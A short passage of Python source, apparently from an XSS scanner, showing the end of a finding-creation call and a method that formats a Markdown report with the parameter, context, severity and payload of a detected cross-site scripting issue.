                vuln_type='xss',
                param=param,
                payload=payload.payload
            )
    
    def _generate_description(self, param: str, payload: XSSPayload, context: str, xss_type: str) -> str:
        """Generate detailed vulnerability description"""
        desc = f"""## XSS Vulnerability Details

**Type:** {xss_type}
**Parameter:** `{param}`
**Context:** {context}
**Severity:** {payload.severity}

### Payload
```html
{payload.payload}
